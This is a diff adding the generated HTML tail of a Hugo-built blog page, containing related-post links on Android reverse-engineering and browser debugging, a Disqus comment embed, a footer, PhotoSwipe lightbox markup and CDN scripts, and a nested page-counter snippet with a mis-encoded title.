+            <h2 class="article-title">Android逆向基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/logo.58e5bcb0bd3d1324eccad2c3f1e6533d_hu_30f56b4785c67b3c.jpeg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 浏览器调试基础"
+                        
+                        data-hash="md5-WOW8sL09EyTsytLD8eZTPQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">浏览器调试基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
